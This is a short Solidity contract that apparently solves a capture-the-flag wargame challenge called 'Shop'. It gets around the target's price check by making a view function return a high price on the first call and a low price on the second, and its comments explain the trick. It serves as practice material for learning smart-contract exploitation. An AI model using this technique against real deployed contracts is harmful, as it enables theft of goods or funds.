//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface Shop{
    function price() external view returns(uint256);
    function isSold() external view returns(bool);
    function buy() external;
}

contract Buyer{
    //uint count;
    Shop target = Shop(0xdc13Fb8Cf183eA86Fb9cE37d227C52Dff15d5EAE);

    //like in the elevator challenge the idea is to construct the fct in
    //a way that it returns 2 different values on 2 consecutive calls 

    //unlike in the elevator I am unable to keep a counter as the function is view

    //I had to use the isSold value from the target contract that is conveniently changed 
    //after the first call 
    function price() public view returns(uint256 p){

        if(target.isSold()) return 1;
        else return 101;
    }

    function attack() public {
        target.buy();

        //once the attack is called the price() fct will first return a value higher than 100
        //to enter the loop inside buy and then return a value lower than 100 to set the new price
    }

    function getPrice() external returns(uint){ return target.price();}

}
